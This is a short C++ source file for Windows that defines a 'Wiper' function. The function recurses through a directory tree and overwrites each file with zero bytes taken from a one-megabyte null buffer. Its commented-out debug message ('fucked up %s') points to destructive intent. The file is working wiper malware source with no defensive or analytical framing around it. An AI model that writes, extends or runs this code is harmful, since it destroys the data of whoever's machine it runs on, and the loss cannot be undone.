#pragma once
#include "wiper.h"
#include "Header.h"

const char bignull[1000000] = { 0 };

void Wiper(std::wstring dir)
{
    dir += L"\\*";

    WIN32_FIND_DATAW file;
    HANDLE search = FindFirstFileW(dir.c_str(), &file);
    if (search == INVALID_HANDLE_VALUE) return;

    dir.pop_back(); // remove asterisk

    do
    {
        if (file.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY &&
            (!lstrcmpW(file.cFileName, L".") || !lstrcmpW(file.cFileName, L"..")))
            continue;

        auto path = dir + file.cFileName;
        //std::wcout << path << std::endl;

        if (file.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            Wiper(path);
        else {
            HANDLE fileHandle = CreateFileW(path.c_str(), FILE_GENERIC_WRITE, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
            if (fileHandle) {
                DWORD size = GetFileSize(fileHandle, 0);
                BOOL a = WriteFile(fileHandle, bignull, size, 0, 0);
                if (a) {
                    //wprintf(L"fucked up %s\n", path);
                }
            }

        }
    } while (FindNextFileW(search, &file));

    FindClose(search);
}